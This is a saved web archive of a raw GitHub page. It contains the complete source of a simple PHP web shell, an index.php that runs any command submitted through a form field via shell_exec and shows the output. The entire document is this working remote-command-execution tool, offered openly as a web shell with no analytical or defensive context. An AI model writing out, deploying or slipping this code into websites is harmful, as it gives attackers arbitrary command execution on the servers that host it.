bplist00�_WebMainResource�	
^WebResourceURL_WebResourceFrameName_WebResourceData_WebResourceMIMEType_WebResourceTextEncodingName_Ohttps://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.phpPO�<html><head></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">&lt;?php
if (!empty($_POST['cmd'])) {
    $cmd = shell_exec($_POST['cmd']);
}
?&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;!-- By Artyum (https://github.com/artyuum) --&gt;
&lt;head&gt;

    &lt;meta charset="utf-8"&gt;

    &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;

    &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;

    &lt;link rel="stylesheet" type="text/css" href="//bootswatch.com/4/flatly/bootstrap.min.css"&gt;

    &lt;title&gt;Web Shell&lt;/title&gt;

    &lt;style&gt;
        h2 {
            color: rgba(0, 0, 0, .75);
        }

        pre {
            padding: 15px;
            -webkit-border-radius: 5px;
            -moz-border-radius: 5px;
            border-radius: 5px;
            background-color: #ECF0F1;
        }

        .container {
            width: 850px;
        }
    &lt;/style&gt;

&lt;/head&gt;

&lt;body&gt;

    &lt;div class="container"&gt;

        &lt;div class="pb-2 mt-4 mb-2"&gt;
	    &lt;h1&gt;PHP Shell&lt;/h1&gt;
            &lt;h2&gt; Execute a command &lt;/h2&gt;
        &lt;/div&gt;

        &lt;form method="POST"&gt;
            &lt;div class="form-group"&gt;
                &lt;label for="cmd"&gt;&lt;strong&gt;Command&lt;/strong&gt;&lt;/label&gt;
                &lt;input type="text" class="form-control" name="cmd" id="cmd" value="&lt;?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?&gt;" required&gt;
            &lt;/div&gt;
            &lt;button type="submit" class="btn btn-primary"&gt;Execute&lt;/button&gt;
        &lt;/form&gt;

&lt;?php if ($cmd): ?&gt;
        &lt;div class="pb-2 mt-4 mb-2"&gt;
            &lt;h2&gt; Output &lt;/h2&gt;
        &lt;/div&gt;
        &lt;pre&gt;
&lt;?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?&gt;
        &lt;/pre&gt;
&lt;?php elseif (!$cmd &amp;&amp; $_SERVER['REQUEST_METHOD'] == 'POST'): ?&gt;
        &lt;div class="pb-2 mt-4 mb-2"&gt;
            &lt;h2&gt; Output &lt;/h2&gt;
        &lt;/div&gt;
        &lt;pre&gt;&lt;small&gt;No result.&lt;/small&gt;&lt;/pre&gt;
&lt;?php endif; ?&gt;
    &lt;/div&gt;

&lt;/body&gt;

&lt;/html&gt;
</pre></body></html>Ztext/plainUUTF-8    ( 7 N ` v � � �	�	�                           	�